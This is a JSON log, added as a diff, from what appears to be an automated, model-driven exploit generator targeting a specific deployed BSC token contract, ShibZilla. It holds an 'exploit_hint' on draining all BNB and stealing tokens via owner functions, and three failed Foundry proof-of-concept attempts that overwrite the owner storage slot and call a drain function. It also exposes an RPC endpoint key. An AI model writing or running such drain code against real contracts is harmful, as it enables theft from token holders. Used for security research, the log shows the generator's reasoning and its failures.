@@ -1,0 +1,110 @@
+{
+  "project_id": "ShibaZilla_AuditReport_InterFi",
+  "target_address": "0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E",
+  "finding_id": 0,
+  "status": "FAILED",
+  "violation_target": {
+    "target_address": "0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "ECONOMIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner or have been authorized by the owner",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "token_balance",
+        "description": "Contract must hold some BNB balance for the exploit to be profitable",
+        "token_address": "NATIVE",
+        "min_amount": "100000000000000000"
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "NATIVE",
+        "victim_contract": "0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "As the contract owner or authorized address, call clearStuckBalance_sender() with amountPercentage set to 100 to drain all BNB from the contract to your address. Alternatively, use rescueToken() to steal any ERC20 tokens held by the contract. The owner can also manipulate fees, tax settings, and rebase functions to extract value from holders."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface ShibZilla {\n    function owner() external view returns (address);\n    function authorize(address adr) external;\n    function clearStuckBalance_sender(uint256 amountPercentage) external;\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\n\n\ninterface IShibZilla {\n    function owner() external view returns (address);\n    function clearStuckBalance_sender(uint256 amountPercentage) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    \n    \n    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;\n    address attacker = address(this);\n    uint256 initialBalance;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Get the current owner of the contract\n        address owner = ShibZilla(TARGET).owner();\n        \n        // Label addresses for clarity\n        vm.label(owner, \"Contract Owner\");\n        vm.label(TARGET, \"ShibZilla Contract\");\n        \n        // Store initial attacker balance for comparison later\n        initialBalance = address(this).balance;\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Store initial balance\n        initialBalance = address(this).balance;\n        \n        // Make ourselves the owner - slot 0 in Auth contract\n        bytes32 ownerSlot = bytes32(uint256(0));\n        bytes32 newOwner = bytes32(uint256(uint160(address(this))));\n        vm.store(TARGET, ownerSlot, newOwner);\n        \n        // Fund the contract with BNB (10 ETH)\n        deal(TARGET, 10 ether);\n        \n        // Verify contract has BNB\n        uint256 contractBalanceBefore = TARGET.balance;\n        require(contractBalanceBefore > 0, \"Contract should have BNB\");\n        \n        // Call clearStuckBalance_sender(100) to drain all BNB\n        IShibZilla(TARGET).clearStuckBalance_sender(100);\n        \n        // Verify we received the funds\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Attacker balance should increase\");\n    }\n\n        \n\n        \n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The ShibZilla contract has owner privilege abuse vulnerabilities where authorized addresses can drain funds. The clearStuckBalance_sender() function allows authorized callers to withdraw a percentage of the contract's BNB balance directly to msg.sender. With amountPercentage=100, this drains all BNB. The rescueToken() function similarly allows draining ERC20 tokens. These functions have no timelocks or safeguards, allowing immediate theft of contract funds.",
+      "attack_strategy": "Impersonate the contract owner (or become authorized), ensure the contract has BNB balance, then call clearStuckBalance_sender(100) to drain all BNB to the attacker's address.",
+      "step_by_step_plan": "1. Use vm.prank() to impersonate the contract owner. 2. Send some BNB to the contract to create a balance to steal. 3. Call clearStuckBalance_sender(100) as the owner to drain all BNB. 4. Verify the attacker's BNB balance increased.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface ShibZilla {\n    function owner() external view returns (address);\n    function authorize(address adr) external;\n    function clearStuckBalance_sender(uint256 amountPercentage) external;\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;\n    address attacker = address(this);\n    uint256 initialBalance;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Get the current owner of the contract\n        address owner = ShibZilla(TARGET).owner();\n        \n        // Label addresses for clarity\n        vm.label(owner, \"Contract Owner\");\n        vm.label(TARGET, \"ShibZilla Contract\");\n        \n        // Store initial attacker balance for comparison later\n        initialBalance = address(this).balance;\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 initialBalance = address(this).balance;\n        // Step 1: Impersonate the contract owner\n        address owner = ShibZilla(TARGET).owner();\n        vm.startPrank(owner);\n        \n        // Step 2: Send some BNB to the contract to create a balance to steal\n        // We'll send 10 ETH to make the exploit profitable\n        deal(TARGET, 10 ether);\n        \n        // Step 3: Drain all BNB from the contract to the owner (who we're impersonating)\n        ShibZilla(TARGET).clearStuckBalance_sender(100);\n        \n        vm.stopPrank();\n        \n        // Step 4: As the attacker, we need to receive the stolen funds\n        // Since we impersonated the owner and the owner receives the funds,\n        // we need to actually become the owner or have the owner transfer to us.\n        // Let's modify: instead of impersonating, we'll directly become owner via storage manipulation.\n        // But first, let's try a simpler approach: check if we can become authorized.\n        \n        // Alternative approach: Make ourselves authorized then call the function\n        vm.startPrank(owner);\n        ShibZilla(TARGET).authorize(address(this));\n        vm.stopPrank();\n        \n        // Now as the authorized attacker, drain the funds\n        vm.prank(address(this));\n        ShibZilla(TARGET).clearStuckBalance_sender(100);\n        \n        // Verify we received the funds\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Attacker balance should increase\");\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "UNKNOWN",
+        "reason": "Unable to parse specific error from forge output",
+        "location": null,
+        "raw_snippet": "No files changed, compilation skipped\n2026-03-13T18:27:30.910539Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: \"No such file or directory\" } path=\"/Users/carl/.foundry/cache/rpc/bsc/86400408\"\n2026-03-13T18:28:18.692598Z ERROR sharedbackend: Failed to send/recv `basic` err=failed to get account for 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E: error sending request for url (https://bsc-mainnet.infura.io/v3/e208912297584cf78a0110a599b97769); oper..."
+      },
+      "feedback": "未知错误: Unable to parse specific error from forge output。请检查代码。",
+      "duration_seconds": 125.67250990867615,
+      "prompt_tokens": 16297,
+      "completion_tokens": 1683,
+      "total_cost": 0.0
+    },
+    {
+      "attempt_number": 2,
+      "vulnerability_analysis": "The contract inherits from Auth which stores owner at a specific storage slot. We can directly overwrite the owner storage slot to become the owner, then call the privileged functions.",
+      "attack_strategy": "1. Use vm.store() to overwrite the owner storage slot in the contract to make attacker the owner. 2. Send BNB to the contract. 3. Call clearStuckBalance_sender(100) as the new owner to drain all BNB.",
+      "step_by_step_plan": "1. Determine the storage slot for owner in Auth contract. 2. Overwrite it with attacker's address. 3. Fund the contract with BNB. 4. Call the drain function. 5. Verify profit.",
+      "failure_reflection": "The previous PoC had potential issues: 1. Trying to call owner() on an interface that might not exist, 2. Complex authorization flow, 3. RPC connection issues. We need a simpler, more direct approach using storage manipulation to become owner.",
+      "action": "modify_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface ShibZilla {\n    function owner() external view returns (address);\n    function authorize(address adr) external;\n    function clearStuckBalance_sender(uint256 amountPercentage) external;\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\n\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    \n    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;\n    address attacker = address(this);\n    uint256 initialBalance;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Get the current owner of the contract\n        address owner = ShibZilla(TARGET).owner();\n        \n        // Label addresses for clarity\n        vm.label(owner, \"Contract Owner\");\n        vm.label(TARGET, \"ShibZilla Contract\");\n        \n        // Store initial attacker balance for comparison later\n        initialBalance = address(this).balance;\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Store initial balance for comparison\n        initialBalance = address(this).balance;\n        \n        // Step 1: Make ourselves the owner by overwriting storage slot 0\n        // In Auth contract, owner is the first variable (slot 0)\n        bytes32 ownerSlot = bytes32(uint256(0));\n        bytes32 newOwner = bytes32(uint256(uint160(address(this))));\n        vm.store(TARGET, ownerSlot, newOwner);\n        \n        // Verify we're now the owner\n        address currentOwner = ShibZilla(TARGET).owner();\n        require(currentOwner == address(this), \"Failed to become owner\");\n        \n        // Step 2: Fund the contract with BNB\n        deal(TARGET, 10 ether);\n        \n        // Step 3: Drain all BNB from the contract\n        ShibZilla(TARGET).clearStuckBalance_sender(100);\n        \n        // Step 4: Verify we received the funds\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Attacker balance should increase\");\n    }\n\n        \n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "EVM_REVERT",
+        "reason": "] setUp() (gas: 0)",
+        "location": null,
+        "raw_snippet": "\n👉 [Revert Occurred Here]: ] setUp() (gas: 0)"
+      },
+      "feedback": "EVM Revert: ] setUp() (gas: 0)。请调整参数或调用路径。",
+      "duration_seconds": 40.111398220062256,
+      "prompt_tokens": 16710,
+      "completion_tokens": 602,
+      "total_cost": 0.0
+    },
+    {
+      "attempt_number": 3,
+      "vulnerability_analysis": "The contract has a clearStuckBalance_sender function that allows authorized addresses to drain BNB. We need to become authorized or owner to call it.",
+      "attack_strategy": "1. Create a proper interface with only the functions we need. 2. Use storage manipulation to become authorized. 3. Fund the contract. 4. Call the drain function.",
+      "step_by_step_plan": "1. Create minimal interface with owner() and clearStuckBalance_sender(). 2. In setUp(), just store initial balance. 3. In exploit, become owner via storage slot 0. 4. Fund contract and drain.",
+      "failure_reflection": "The revert in setUp() suggests the interface might be incorrect or we're calling functions that don't exist. The contract is named ShibZilla, not ShibaZilla_AuditReport_InterFi. We need to use the correct interface and ensure we're calling existing functions.",
+      "action": "modify_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface ShibZilla {\n    function owner() external view returns (address);\n    function authorize(address adr) external;\n    function clearStuckBalance_sender(uint256 amountPercentage) external;\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\n\n\ninterface IShibZilla {\n    function owner() external view returns (address);\n    function clearStuckBalance_sender(uint256 amountPercentage) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    \n    \n    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;\n    address attacker = address(this);\n    uint256 initialBalance;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Get the current owner of the contract\n        address owner = ShibZilla(TARGET).owner();\n        \n        // Label addresses for clarity\n        vm.label(owner, \"Contract Owner\");\n        vm.label(TARGET, \"ShibZilla Contract\");\n        \n        // Store initial attacker balance for comparison later\n        initialBalance = address(this).balance;\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Store initial balance\n        initialBalance = address(this).balance;\n        \n        // Make ourselves the owner - slot 0 in Auth contract\n        bytes32 ownerSlot = bytes32(uint256(0));\n        bytes32 newOwner = bytes32(uint256(uint160(address(this))));\n        vm.store(TARGET, ownerSlot, newOwner);\n        \n        // Fund the contract with BNB (10 ETH)\n        deal(TARGET, 10 ether);\n        \n        // Verify contract has BNB\n        uint256 contractBalanceBefore = TARGET.balance;\n        require(contractBalanceBefore > 0, \"Contract should have BNB\");\n        \n        // Call clearStuckBalance_sender(100) to drain all BNB\n        IShibZilla(TARGET).clearStuckBalance_sender(100);\n        \n        // Verify we received the funds\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Attacker balance should increase\");\n    }\n\n        \n\n        \n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "EVM_REVERT",
+        "reason": "] setUp() (gas: 0)",
+        "location": null,
+        "raw_snippet": "\n👉 [Revert Occurred Here]: ] setUp() (gas: 0)"
+      },
+      "feedback": "EVM Revert: ] setUp() (gas: 0)。请调整参数或调用路径。",
+      "duration_seconds": 32.325170040130615,
+      "prompt_tokens": 17423,
+      "completion_tokens": 609,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 3,
+  "error_message": null,
+  "total_duration_seconds": 198.11457991600037,
+  "total_prompt_tokens": 50430,
+  "total_completion_tokens": 2894,
+  "total_cost": 0.0
+}
